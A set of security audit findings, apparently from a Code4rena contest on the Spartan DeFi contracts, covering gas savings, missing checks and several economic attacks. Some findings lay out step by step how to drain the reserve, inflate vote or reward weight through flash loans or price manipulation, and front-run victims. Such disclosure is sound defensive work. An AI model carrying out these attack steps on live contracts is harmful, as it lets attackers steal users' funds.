# Handle  gpersoon   # Vulnerability details  ## Impact The function getPool doesn't check if the pool exits (e.g. it doesn't check if the resulting pool !=0) Other functions use the results of getPool and do followup actions.  For example createSynth checks isCuratedPool(_pool) == true; if somehow isCuratedPool(0) would set to be true, then further actions could be done. As far as I can see no actual problem occurs, but this is a dangerous construction and future code changes could introduce vulnerabilities. Additionally the reverts that will occur if the result of getPool==0 are perhaps difficult to troubleshoot.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L119     function getPool(address token) public view returns(address pool){         if(token == address(0)){             pool = mapToken_Pool[WBNB];   // Handle BNB         } else {             pool = mapToken_Pool[token];  // Handle normal token         }          return pool;     }  function createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){         require(getPool(token) == address(0)); // Must be a valid token       function createPool(address token) external onlyDAO returns(address pool){         require(getPool(token) == address(0)); // Must be a valid token       // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/synthFactory.sol#L37  function createSynth(address token) external returns(address synth){         require(getSynth(token) == address(0), "exists"); // Synth must not already exist         address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get pool address         require(iPOOLFACTORY(_DAO().POOLFACTORY()).isCuratedPool(_pool) == true, "!curated"); // Pool must be Curated   ## Tools Used  ## Recommended Mitigation Steps In function getPool add something like: require  (pool !=0, "Pool doesn't exist");  Note: the functions createPoolADD and createPool also have to be changed, to use a different way to verify the pool doesn't exist.   
# Handle  gpersoon   # Vulnerability details  ## Impact Sometimes the reference to function calls, that are done via the DAO, are looked up multiple times in one function call. For example mintSynth calls:  ​ -   _DAO() 4x -   _DAO().UTILS() 3x  This can be done more efficient by caching the result of _DAO() and _DAO().UTILS()  f## Proof of Concept // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229 ​function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {        ​require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, "!synth"); // Must be a valid Synth      ​..        ​uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount); // Calculate value of swapping SPARTA to the relevant underlying TOKEN        ​uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted       ​..        ​uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN        ​fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA        ​  function _DAO() internal view returns(iDAO) {        ​return iBASE(BASE).DAO();    ​}  //https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L624 ​function UTILS() public view returns(iUTILS){        ​if(daoHasMoved){            ​return Dao(DAO).UTILS();        ​} else {            ​return _UTILS;        ​}    ​}  ## Tools Used  ## Recommended Mitigation Step Cache _DAO() and cache the sub functions like: _DAO().UTILS()) If called multiple times from function  
# Handle  shw   # Vulnerability details  ## Impact  The `getPoolShareWeight` function returns a user's pool share weight by calculating how many SPARTAN the user's LP tokens account for. However, this approach is vulnerable to flash loan manipulation since an attacker can swap a large number of TOKEN to SPARTAN to increase the number of SPARTAN in the pool, thus effectively increasing his pool share weight.  ## Proof of Concept  According to the implementation of `getPoolShareWeight,` a user's pool share weight is calculated by `uints * baseAmount / totalSupply`, where `uints` is the number of user's LP tokens, `totalSupply` is the total supply of LP tokens, and `baseAmount` is the number of SPARTAN in the pool. Thus, a user's pool share weight is proportional to the number of SPARTAN in the pool. Consider the following attack scenario:  1. Supposing the attacked pool is SPARTAN-WBNB. The attacker first prepares some LP tokens (WBNB-SPP) by adding liquidity to the pool. 2. The attacker then swaps a large number of WBNB to SPARTAN, which increases the pool's `baseAmount`. He could split his trade into small amounts to reduce slip-based fees. 3. The attacker now wants to increase his weight in the `DaoVault`. He adds his LP tokens to the pool by calling the `deposit` function of `Dao.` 4. `Dao` then calls `depositLP` of `DaoVault`, causing the attacker's weight to be recalculated. Due to the large proportion of SPARTAN in the pool, the attacker's weight is artificially increased. 5. With a higher member weight, the attacker can, for example, vote the current proposal with more votes than he should have or obtain more rewards when calling `harvest` of the `Dao` contract. 6. The attacker then swaps back SPARTAN to WBNB and only loses the slip-based fees.  Referenced code: [Utils.sol#L46-L50](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L46-L50) [Utils.sol#L70-L77](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L70-L77) [DaoVault.sol#L44-L56](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/DaoVault.sol#L44-L56) [Dao.sol#L201](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L201) [Dao.sol#L570](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L570)  ## Recommended Mitigation Steps  A possible mitigation is to record the current timestamp when a user's weight in the `DaoVault` or `BondVault` is recalculated and force the new weight to take effect only after a certain period, e.g., a block time. This would prevent the attacker from launching the attack since there is typically no guarantee that he could arbitrage the WBNB back in the next block.  
# Handle  shw   # Vulnerability details  ## Impact  The `claimAllForMember` function of `Dao` is permissionless, allowing anyone to claim the unlocked bonded LP tokens for any member. However, claiming a member's LP tokens could decrease the member's weight in the `BondVault`, thus affecting the member's votes and rewards in the `Dao` contract.   ## Proof of Concept  For example, an attacker can intentionally front-run a victim's `voteProposal` call to decrease the victim's vote weight to prevent the proposal from being finalized:  1. Supposing the victim's member weight in the `BondVault` is 201, the total weight is 300. The victim has some LP tokens claimable from the vault, and if claimed, the victim's weight will be decreased to 101. To simplify the situation, assuming that the victim's weight in the `DaoVault` and the total weight of the `DaoVault` are both 0. 2. The victim wants to vote on the current proposal, which requires the majority consensus. If the victim calls `voteProposal`, the proposal will be finalized since the victim has the majority weight (201/300 > 66.6%). 3. An attacker does not want the proposal to be finalized, so he calls `claimAllForMember` with the victim as the parameter to intentionally decrease the victim's weight. 4. As a result, the victim's weight is decreased to 101, and the total weight is decreased to 200. The victim cannot finalize the proposal since he has no majority anymore (101/200 < 66.6%).  Similarly, an attacker can front-run a victim's `harvest` call to intentionally decrease the victim's reward since the amount of reward is calculated based on the victim's current weight.  Referenced code: [Dao.sol#L179-L206](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L179-L206) [Dao.sol#L276-L285](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L276-L285) [Dao.sol#L369-L383](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L369-L383) [Dao.sol#L568-L574](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L568-L574) [Dao.sol#L577-L586](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L577-L586) [BondVault.sol#L104-L117](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L104-L117) [BondVault.sol#L120-L129](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L120-L129) [BondVault.sol#L155-L162](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L155-L162)  ## Recommended Mitigation Steps  Consider removing the `member` parameter in the `claimAllForMember` function and replace all `member` to `msg.sender` to allow only the user himself to claim unlocked bonded LP tokens.  
# Handle  shw   # Vulnerability details  ## Impact  Several functions in `Utils` do not handle edge cases where the divisor is 0, caused mainly by no liquidity in the pool. In such cases, the transactions revert without returning a proper error message.  ## Proof of Concept  Referenced code: [Utils.sol#L75](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L75) [Utils.sol#L90](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L90) [Utils.sol#L109-L110](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L109-L110) [Utils.sol#L123-L124](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L123-L124) [Utils.sol#L131](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L131) [Utils.sol#L138](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L138) [Utils.sol#L155](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L155) [Utils.sol#L189](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L189) [Utils.sol#L195](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L195) [Utils.sol#L215](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L215)  ## Recommended Mitigation Steps  Check if the divisors are 0 in the above functions to handle edge cases.  
# Handle  0xsanson   # Vulnerability details  ## Impact In Router.sol, the function addLiquidityForMember() doesn't check inputBase and inputToken. Since we know they can't both be zero (it wouldn't change anything and user pays the gas for nothing).  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L51  ## Tools Used editor  ## Recommended Mitigation Steps Consider adding a require `inputBase>0 || inputToken>0`.  
# Handle  0xsanson   # Vulnerability details  ## Impact In Router.sol, there's a loss of precision that can be corrected by shifting the operations.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L274  ## Tools Used editor  ## Recommended Mitigation Steps Consider rewriting L274-275 with `uint numerator = (_fees * reserve) / eraLength / maxTrades;`.  
# Handle  0xsanson   # Vulnerability details  ## Impact zapLiquidity() in Router.sol misses an input validation unitsInput > 0.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L59  ## Tools Used editor  ## Recommended Mitigation Steps Add an input validation for unitsInput.  
# Handle  JMukesh   # Vulnerability details  ## Impact https://docs.soliditylang.org/en/v0.8.6/contracts.html#constant-and-immutable-state-variables  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L11  ## Tools Used  manual review  ## Recommended Mitigation Steps   
# Handle  JMukesh   # Vulnerability details  ## Impact  https://docs.soliditylang.org/en/v0.8.6/contracts.html#constant-and-immutable-state-variables  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L15  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L14  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L18  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L7 https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L12  ## Tools Used  manual review  ## Recommended Mitigation Steps  
# Handle  0xsanson   # Vulnerability details  ## Impact In Synth.sol, the function burnSynth() calculates a division between two variables. Since they can be zero, it's better to have a require with a clear error message when the division is not possible, otherwise an user wouldn't know why a transaction reverted.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Synth.sol#L176  ## Tools Used editor  ## Recommended Mitigation Steps Add a require(denom != 0, "LPDebt = 0").  
# Handle  0xsanson   # Vulnerability details  ## Impact In synthFactory.sol, there's an `event CreateSynth(address indexed token, address indexed pool)`. However the event is emitted with "synth" as second output.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/synthFactory.sol#L13 https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/synthFactory.sol#L46  ## Tools Used editor  ## Recommended Mitigation Steps Think about what's the better variable to be emitted, and correct one of the lines.  
# Handle  heiho1   # Vulnerability details  ## Impact  Pool.burnSynth(address,address) is potentially a reentrant method because it executes transfers and burning before updating balances/metrics.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L245  ## Tools Used  Slither  ## Recommended Mitigation Steps  The function should update state before external calls.  Consider using a nonReentrant guard as provided by OpenZeppelin:  https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard  
# Handle  cmichel   # Vulnerability details  The `Router.addDividend` function tells the reserve to send dividends to the pool depending on the fees.  - The attacker provides LP to a curated pool. Ideally, they become a large LP holder to capture most of the profit, they should choose the smallest liquidity pool as the dividends are pool-independent. - The `normalAverageFee` variable that determines the pool dividends can be set to zero by the attacker by trading a single wei in the pool `arrayFeeSize` (20) times (use `buyTo`). The fees of the single wei trades will be zero and thus the `normalAverageFee` will also be zero as, see `addTradeFee`. - The attacker then does a trade that generates some non-zero fees, setting the `normalAverageFee` to this trade's fee. The `feeDividend` is then computed as `_fees * dailyAllocation / (_fees + normalAverageFee) = _fees * dailyAllocation / (2 * _fees) = dailyAllocation / 2`. Half of the `dailyAllocation` is sent to the pool. - The attacker repeats the above steps until the reserve is almost empty. Each time the `dailyAllocation` gets smaller but it's still possible to withdraw almost all of it. - They redeem their LP tokens and gain a share of the profits  ## Impact The reserve can be emptied by the attacker.  ## Recommended Mitigation Steps Counting only the last 20 trades as a baseline for the dividends does not work. It should probably average over a timespan but even that can be gamed if it is too short. I think a better idea is to compute the dividends based on **volume** traded over a timespan instead of looking at individual trades.   
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details  The `SynthVault.withdraw` function does not claim the user's rewards. It decreases the user's weight and therefore they are forfeiting their accumulated rewards. The `synthReward` variable in `_processWithdraw` is also never used - it was probably intended that this variable captures the claimed rewards.  ## Impact Usually, withdrawal functions claim rewards first but this one does not. A user that withdraws loses all their accumulated rewards.  ## Recommended Mitigation Steps Claim the rewards with the user's deposited balance first in `withdraw`.   
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details  The `SynthVault.harvestSingle` function can be used to mint & deposit synths without using a lockup. An attacker sends `BASE` tokens to the pool and then calls `harvestSingle`. The inner `iPOOL(_poolOUT).mintSynth(synth, address(this));` call will mint synth tokens to the vault based on the total `BASE` balance sent to the pool, including the attacker's previous transfer. They are then credited the entire amount to their `weight`.  This essentially acts as a (mint +) deposit without a lock-up period.  ## Recommended Mitigation Steps Sync the pool before sending `BASE` to it through `iRESERVE(_DAO().RESERVE()).grantFunds(reward, _poolOUT);` such that any previous `BASE` transfer is wasted. This way only the actual reward's weight is increased.  
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details  The `SynthVault._deposit` function adds `weight` for the user that depends on the spot value of the deposit synth amount in `BASE`. This spot price can be manipulated and the cost of manipulation is relative to the pool's liquidity. However, the reward (see `calcReward`) is measured in BASE tokens unrelated to the pool. Therefore, if the pool's liquidity is low and the reward reserve is high, the attack can be profitable:  1. Manipulate the pool spot price of the `iSYNTH(_synth).LayerONE()` pool by dripping a lot of `BASE` into it repeatedly (sending lots of smaller trades is less costly due to the [path-independence of the continuous liquidity model](https://docs.thorchain.org/thorchain-finance/continuous-liquidity-pools)). This increases the `BASE` per `token` price. 2. Call `SynthVault.depositForMember` and deposit a _small_ amount of synth token. The `iUTILS(_DAO().UTILS()).calcSpotValueInBase(iSYNTH(_synth).LayerONE(), _amount)` will return an inflated weight due to the price. 3. Optionally drip more `BASE` into the pool and repeat the deposits 4. Drip back `token` to the pool to rebalance it  The user's `weight` is now inflated compared to the deposited / locked-up amount and they can claim a large share of the rewards.  ## Impact The cost of the attack depends on the pool's liquidity and the profit depends on the reserve. It could therefore be profitable under certain circumstances.  ## Recommended Mitigation Steps Track a TWAP price of the synth instead, store the deposited synths instead, and compute the weight & total weight on the fly based on the TWAP * deposit amount instead of at the time of deposit.  
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `Synth._transfer` function does not check if `recipient != 0`. Unlike standard ERC20, tokens can be accidentally burned this way.  ## Recommended Mitigation Steps Prevent user errors by denying transfers to the zero address and forcing them to call `burn` instead.  
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details  The protocol differentiates between public pool creations and private ones (starting without liquidity). However, this is not effective as anyone can just flashloan the required initial pool liquidity, call `PoolFactory.createPoolADD`, receive the LP tokens in `addForMember` and withdraw liquidity again.  ## Recommended Mitigation Steps Consider burning some initial LP tokens or taking a pool creation fee instead.   
# Handle  maplesyrup   # Vulnerability details  ## Impact Gas optimizations Does not affect the contract in any harmful way. Suggestions allow for smart contract gas optimizations.  ## Proof of Concept According to Slither analyzer documentation (https://github.com/crytic/slither/wiki/Detector-Documentation#state-variables-that-could-be-declared-constant), the variable in contract Utils.sol called "one" or Utils.one can be set to a constant as it is considered a variable that does not change throughout the contract.   Slither Detectors:  constable-states:  Utils.one (contracts/Utils.sol, lines#11) should be constant  ------------  Code in contract:  uint public one = 10**18; <---- can be constant as it does not change  --------------  Console output (via Slither in JSON format):    "constable-states": [     "Utils.one (contracts/Utils.sol#11) should be constant\n"   ],  ## Tools Used  Spartan Contracts Solidity (v 0.8.3) Slither Analyzer (v 0.8.0)  ## Recommended Mitigation Steps  1. Clone repository for Spartan Smart Contracts 2. Create a python virtual environment with a stable python version 3. Install Slither Analyzer on the python VEM 4. Run Slither against all contracts  
# Handle  maplesyrup   # Vulnerability details  ## Impact  Gas Optimization This does not directly impact the smart contract in anyway besides cost. This is a gas optimization to reduce cost of smart contract.  ## Proof of Concept According to Slither Analyzer documentation (https://github.com/crytic/slither/wiki/Detector-Documentation#public-function-that-could-be-declared-external), there are functions in the contract that are never called. These functions should be declared as external in order to save gas.   Slither Detector:  external-function:  purgeDeployer() should be declared external:  BondVault.purgeDeployer() (contracts/BondVault.sol, lines#50-52)  -----------------------  Console output (via Slither in JSON format):  "external-function": [     "purgeDeployer() should be declared external:\n\t- BondVault.purgeDeployer() (contracts/BondVault.sol#50-52)\n",     "hasMinority(uint256) should be declared external:\n\t- Dao.hasMinority(uint256) (contracts/Dao.sol#601-610)\n",     "ROUTER() should be declared external:\n\t- Dao.ROUTER() (contracts/Dao.sol#615-621)\n",     "UTILS() should be declared external:\n\t- Dao.UTILS() (contracts/Dao.sol#624-630)\n",     "BONDVAULT() should be declared external:\n\t- Dao.BONDVAULT() (contracts/Dao.sol#633-639)\n",     "DAOVAULT() should be declared external:\n\t- Dao.DAOVAULT() (contracts/Dao.sol#642-648)\n",     "POOLFACTORY() should be declared external:\n\t- Dao.POOLFACTORY() (contracts/Dao.sol#651-657)\n",     "SYNTHFACTORY() should be declared external:\n\t- Dao.SYNTHFACTORY() (contracts/Dao.sol#660-666)\n",     "RESERVE() should be declared external:\n\t- Dao.RESERVE() (contracts/Dao.sol#669-675)\n",     "SYNTHVAULT() should be declared external:\n\t- Dao.SYNTHVAULT() (contracts/Dao.sol#678-684)\n",     "greet() should be declared external:\n\t- Greeter.greet() (contracts/Greeter.sol#15-17)\n",     "setGreeting(string) should be declared external:\n\t- Greeter.setGreeting(string) (contracts/Greeter.sol#19-22)\n"   ]  ## Tools Used  Spartan Contracts Solidity (v 0.8.3) Slither Analyzer (v 0.8.0)  ## Recommended Mitigation Steps  1. Clone repository for Spartan Smart Contracts 2. Create a python virtual environment with a stable python version 3. Install Slither Analyzer on the python VEM 4. Run Slither against all contracts  
# Handle  0xRajeev   # Vulnerability details  ## Impact  addCuratedPool() is missing a require(isCuratedPool[_pool] == false) check, similar to the one in removeCuratedPool to ensure that the DAO is not trying to curate an already curated pool which indicates a mismatch of assumption/accounting compared to the contract state.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L79-L87  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L93   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add require(isCuratedPool[_pool] == false) before setting isCuratedPool[_pool] = true.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The token argument used in CreatePool event emit of createPoolADD() should really be _token so that WBNB address is logged in the event instead of zero address when token == 0. Logging a zero address could confuse off-chain user interfaces because it is treated as a burn address by convention.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L60  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L49   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Use _token instead of token in event emit.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  When a member calls removeLiquiditySingle() requesting only SPARTA in return, i.e. toBASE = true, the LP tokens are transferred to the Pool to withdraw the constituent SPARTA and TOKENs back to the Router. The withdrawn TOKENs are then transferred back to the Pool to convert to SPARTA and directly transferred to the member from the Pool. However, the member’s SPARTA are left behind in the Router instead of being returned along with converted SPARTA from the Pool.   In other words, the _member's BASE SPARTA tokens that were removed from the Pool along with the TOKENs are never sent back to the _member because the _token's transferred to the Pool are converted to SPARTA and only those are sent back to member directly from the Pool via swapTo().   This effectively results in member losing the SPARTA component of their Pool LP tokens which get left behind in the Router and are possibly claimed by future transactions that remove SPARTA from Router.  ## Proof of Concept  LPs sent to Pool: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L121  SPARTA and TOKENs withdrawn from Pool to Router: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L122  TOKENs from Router sent to Pool: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L126  TOKENs in Pool converted to BASE SPARTA and sent to member directly from the Pool: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L127   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  1. BASE SPARTA should also be transferred to the Pool before swapTo() so they get sent to the member along with the converted TOKENs via swapTo() 2. Use swap(BASE) instead of swapTo() so that TOKENs are swapped for BASE SPARTA in Pool and sent back to ROUTER. Then send all the SPARTA from ROUTER to member.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The _handleTransferIn() functions use a conditional check (_amount > 0) to execute the transfer-in logic of tokens. This should really be a require() to prevent zero amount transfers into the protocol which will allow subsequent logic to execute and potentially utilize any dust/stuck funds from earlier to be accounted to the sender.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L198-L210  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L202-L206  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L110-L114  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Change condition check to a require() which will revert any transfers of zero tokens/funds.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  This isListedPool check implemented by isPool() is missing in many functions of the contract that accept pool/token addresses from users. getPool() returns the default mapping value of 0 for token that do not have valid pools. This lack of input validation may lead to use of zero/invalid pool addresses in the protocol context and reverts in the best case or burn/loss of user funds in the worst case.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L119-L133  Use of getPool() without isPool() check: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/BondVault.sol#L108  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L52  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L81  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L139  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L155  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L175  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L232  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L247-L248  Several usages of getPool() in Utils.sol and other places.  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Combine isPool() isListedPool check to getPool() so that it always returns a valid/listed pool in the protocol.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The threshold check for basisPoints while a required part of input validation is an unnecessary redundant check because calcPart() does a similar upper bound check and the lower bound check on 0 is only an optimization.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L95  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L65   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Remove redundant check to save gas and improve readability/maintainability.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  _token is conditionally set (to WBNB) but never used in addLiquiditySingleForMember() function unlike its usage in other functions. Such usage typically indicates missing/incorrect functionality. It looks like _handleTransferIn checks token == 0 again to consider BNB.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L83  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Recommend re-evaluating _token usage in this function, adding any missing logic or removing it for readability/maintainability.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  zapLiquidity() used to trade LP tokens of one pool to another is missing a check for toPool != fromPool which may happen accidentally. The check will prevent unnecessary transfers and avoid any fees/slippage or accounting errors.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L58-L71   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add toPool != fromPool as part of input validation.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  An attacker can front-run any operation that depends on the pool contract's internal balance amounts being unsynced to pool's balance on token/base contracts effectively nullifying the transfer of base/tokens for those operations. This will make _getAddedBaseAmount() and _getAddedTokenAmount() return 0 (because the balances are synced) from such operations.   Impact: The affected operations are: addForMember(), swapTo() and mintSynth() which will all take the user funds to respective contracts but will treat it as 0 (because of the syncing) and thus not add liquidity, return swapped tokens or mint any synths to the affected users. User loses deposited funds to the contract.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L308-L312  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L261-L270  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L272-L281  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L216-L220  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L231  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L174-L175  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L279  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add access control to sync() function so that only Router can call it via addDividend().  
# Handle  0xRajeev   # Vulnerability details  ## Impact  Incorrect event parameter outputAmount is used (instead of output) in the MintSynth event emit. outputAmount is a named return variable that is never set in this function and so will always be 0. This should instead be output. This will confuse the UI or offchain monitoring tools that 0 synths were minted and will lead to users panicking/complaining or trying to mint synth again.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L240  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L232  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Replace outputAmount with output in the emit.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  If moveDAO() is executed after voting, the existing DAO contract continues to function as before whereas it should ideally cease to function/exist from the users’ perspective or at least function as a clone of the new DAO by using the same addresses as it does.  Scenario: moveDAO is executed to make DAO and BASE.DAO point to the new address. Existing DAO contract continues to function but all the other interfacing contracts (ROUTER, UTILS, DAOVAULT, BONDVAULT, SYNTHVAULT, POOLFACTORY, SYNTHFACTORY and RESERVE) use the updated DAO address as updated in BASE. At a minimum, this leads to undefined behavior and at worst an attack where the old DAOs (there could be many) are exploited because it still points to valid router, pool and vault contracts.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L451-L459   changeDAO: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/outside-scope/Sparta.sol#L189-L193   Use of BASE.DAO: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/BondVault.sol#L54-L57  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/DaoVault.sol#L32-L34  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L39-L41  